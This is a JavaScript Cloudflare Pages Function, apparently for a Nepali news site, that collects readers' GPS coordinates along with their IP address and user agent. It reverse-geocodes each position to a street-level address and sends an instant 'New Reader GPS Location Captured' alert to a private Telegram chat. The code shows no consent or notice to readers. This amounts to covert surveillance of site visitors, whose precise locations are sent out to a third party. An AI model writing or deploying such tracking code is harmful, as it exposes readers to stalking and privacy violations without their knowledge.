// Cloudflare Pages Function: /api/location with Telegram Instant Alerts

// Reverse geocode via OpenStreetMap Nominatim
async function reverseGeocode(lat, lon) {
  try {
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ne,en`;
    const res = await fetch(url, {
      headers: {
        'User-Agent': 'BulletKhabar-LocationService/1.0',
      },
    });
    if (!res.ok) return null;
    const data = await res.json();
    const addr = data.address || {};

    return {
      displayName: data.display_name || '',
      road: addr.road || addr.street || '',
      neighbourhood: addr.neighbourhood || addr.suburb || addr.quarter || '',
      city: addr.city || addr.town || addr.municipality || addr.village || '',
      district: addr.state_district || addr.county || '',
      state: addr.state || '',
      country: addr.country || '',
      mapsUrl: `https://www.google.com/maps?q=${lat},${lon}`,
    };
  } catch {
    return {
      displayName: '',
      mapsUrl: `https://www.google.com/maps?q=${lat},${lon}`,
    };
  }
}

async function sendTelegramAlert(env, record) {
  const token = env.TELEGRAM_BOT_TOKEN;
  const chatId = env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) return;

  const area = record.address?.neighbourhood || record.address?.road || 'Unknown Area';
  const city = record.address?.city || record.address?.district || 'Nepal';
  const mapsUrl = record.address?.mapsUrl || `https://www.google.com/maps?q=${record.latitude},${record.longitude}`;

  const message = `📍 *New Reader GPS Location Captured*
━━━━━━━━━━━━━━━━━━━
📰 *Article:* \`${record.slug}\`
🏙️ *Area / Tole:* ${area}
🗺️ *City / District:* ${city}
📌 *Full Address:* ${record.address?.displayName || 'N/A'}
🎯 *Accuracy:* ±${record.accuracy || '?'} meters
🌐 *IP:* \`${record.ip}\`
⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Kathmandu' })} (Nepal Time)

🔗 [Open in Google Maps](${mapsUrl})`;

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: false,
      }),
    });
  } catch (e) {
    console.error('Telegram notification error:', e);
  }
}

export async function onRequestPost(context) {
  try {
    const body = await context.request.json();
    const { latitude, longitude, accuracy, slug } = body;

    if (latitude === undefined || longitude === undefined) {
      return new Response(JSON.stringify({ error: 'Latitude and longitude required' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' },
      });
    }

    const address = await reverseGeocode(latitude, longitude);

    const record = {
      id: Date.now().toString(),
      latitude,
      longitude,
      accuracy: accuracy ? Math.round(accuracy) : null,
      address,
      slug: slug || 'home',
      timestamp: new Date().toISOString(),
      ip: context.request.headers.get('cf-connecting-ip') || 'local',
      userAgent: context.request.headers.get('user-agent') || '',
    };

    // Send Telegram alert in background
    context.waitUntil(sendTelegramAlert(context.env, record));

    return new Response(JSON.stringify({ success: true, record }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    });
  } catch {
    return new Response(JSON.stringify({ error: 'Failed to record location' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' },
    });
  }
}

export async function onRequestGet() {
  return new Response(JSON.stringify({ status: 'ok', service: 'Telegram Location Service' }), {
    status: 200,
    headers: { 'Content-Type': 'application/json' },
  });
}
